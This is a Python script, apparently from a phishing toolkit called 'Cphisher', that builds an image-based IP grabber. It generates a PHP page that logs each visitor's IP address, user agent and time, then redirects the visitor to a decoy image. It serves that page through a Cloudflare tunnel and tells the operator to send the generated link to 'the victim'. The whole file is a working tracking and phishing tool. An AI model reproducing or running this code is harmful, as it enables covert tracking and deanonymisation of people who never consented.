#!/usr/bin/env python3
import os
import time
import sys

# الألوان المتناسقة مع Cphisher
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
PURPLE = "\033[95m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
RESET  = "\033[0m"

def start_img_logger():
    # الانتقال لمجلد الأداة لضمان عمل ملفات الـ PHP
    folder_path = os.path.dirname(os.path.realpath(__file__))
    os.chdir(folder_path)

    os.system("clear")
    print(BLUE + """
    ░█▀▀█ █▀▀█ █▀▀█ █▀▀▄ █▀▀▄ █▀▀ █▀▀█ 
    ░█░░█ █▄▄▀ █▄▄█ █▀▀▄ █▀▀▄ █▀▀ █▄▄▀ 
    ░█▄▄█ ▀░▀▀ ▀░░▀ ▀▀▀░ ▀▀▀░ ▀▀▀ ▀░▀▀
    [ Image Tracking & IP Grabber Tool ]
    """ + RESET)
    
    print(CYAN + "    " + "━" * 50 + RESET)
    print(YELLOW + "    [*] Target: Gather IP & Metadata via Image" + RESET)
    
    # طلب رابط الصورة الحقيقية التي ستظهر للضحية
    print(WHITE + "\n    [!] Enter a direct image URL (e.g., https://site.com/pic.jpg)")
    decoy_img = input(CYAN + "    └───> " + RESET)
    
    if not decoy_img:
        decoy_img = "https://i.imgur.com/866J836.jpg" # صورة افتراضية
    
    # تحديث رابط الصورة في ملف PHP برمجياً
    with open("log.php", "w") as f:
        php_code = f"""<?php
$file = 'logs.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');
$data = "DATE: $date | IP: $ip | UA: $ua\\n";
file_put_contents($file, $data, FILE_APPEND);
header('Location: {decoy_img}');
exit;
?>"""
        f.write(php_code)

    print(GREEN + "\n    [*] Initializing Phishing Server..." + RESET)
    os.system("fuser -k 8081/tcp > /dev/null 2>&1") # إغلاق أي سيرفر قديم
    os.system("php -S 127.0.0.1:8081 > /dev/null 2>&1 &")
    time.sleep(2)

    print(YELLOW + "    [*] Starting Cloudflare Tunnel..." + RESET)
    print(RED + "    [!] Send the generated link to the victim!" + RESET)
    print(PURPLE + "    [!] Check 'logs.txt' in the tool folder for results.\n" + RESET)
    
    # تشغيل النفق وتوجيهه لملف log.php
    os.system("cloudflared tunnel --url http://127.0.0.1:8081/log.php --protocol http2")

if __name__ == "__main__":
    start_img_logger()
